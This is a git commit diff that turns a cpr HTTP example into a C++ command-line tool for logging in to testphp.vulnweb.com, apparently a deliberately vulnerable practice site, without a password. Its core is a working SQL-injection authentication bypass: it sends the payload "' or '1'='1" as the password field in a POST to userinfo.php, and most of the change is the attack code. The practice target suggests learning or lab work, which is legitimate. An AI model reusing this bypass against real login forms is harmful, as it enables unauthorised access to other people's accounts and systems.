7b1f282547a2794d9fce70648869e2c2807b5c8c
GG <gueltro@gmail.com>
2024-09-11 19:26:49 +0200

    Login to testphp.vulnweb.com/ without password.

--- main.cpp
+++ main.cpp
@@ -2,15 +2,54 @@
 #include <string>
 #include <cpr/cpr.h>
 
-int main(int argc, char** argv) {
-    cpr::Response r = cpr::Get(cpr::Url{"https://api.github.com/repos/whoshuu/cpr/contributors"},
-                               cpr::Authentication{"user", "pass", cpr::AuthMode::BASIC},
-                               cpr::Parameters{{"anon", "true"}, {"key", "value"}});
-    std::cout << "Status code: " << r.status_code << '\n';
-    std::cout << "Header:\n";
-    for (const std::pair<const std::basic_string<char>, std::basic_string<char>>& kv : r.header) {
-        std::cout << '\t' << kv.first << ':' << kv.second << '\n';
+const std::string urlAddress = "http://testphp.vulnweb.com/userinfo.php";
+const std::string nameKey = "uname";
+const std::string passKey = "pass";
+const std::string injectionString = "' or '1'='1";
+
+cpr::Response Login(std::string name, std::string password) {
+    cpr::Url url{urlAddress};
+    cpr::Payload payload{{nameKey, std::move(name)}, {passKey, std::move(password)}};
+    return cpr::Post(std::move(url), std::move(payload));
+}
+
+cpr::Response LoginWithoutPassword(std::string name) {
+	return Login(std::move(name), injectionString);
+}
+
+void printResponse(cpr::Response response) {
+    if (response.status_code == cpr::status::HTTP_OK) {
+   	std::cout << response.text << std::endl;
     }
-    std::cout << "Text: " << r.text << '\n';
+    else {
+	std::cout << "Something went wrong! Received status " << response.status_code << std::endl;
+    }
+}
+
+void printInstruction() {
+	std::cout << "testphp_login only accepts one or two arguments." << std::endl;
+	std::cout << "You must specify a USERNAME and optionally a PASSWORD with the following syntax:" << std::endl;
+	std::cout <<  "testphp_login USERNAME PASSWORD" << std::endl;
+	std::cout <<  "testphp_login USERNAME" << std::endl;
+}
+
+int main(int argc, char** argv) {
+    cpr::Response response;
+
+    // Username and password were provided.
+    if (argc == 3) {
+	response = Login(argv[1], argv[2]);
+	printResponse(std::move(response));
+    }
+    // Only username was provided.
+    else if (argc == 2) {
+	response = LoginWithoutPassword(argv[1]);
+	printResponse(std::move(response));
+    }
+    // Invalid input, teach the user how to use this app.
+    else {
+	printInstruction();
+    }
+
     return 0;
 }
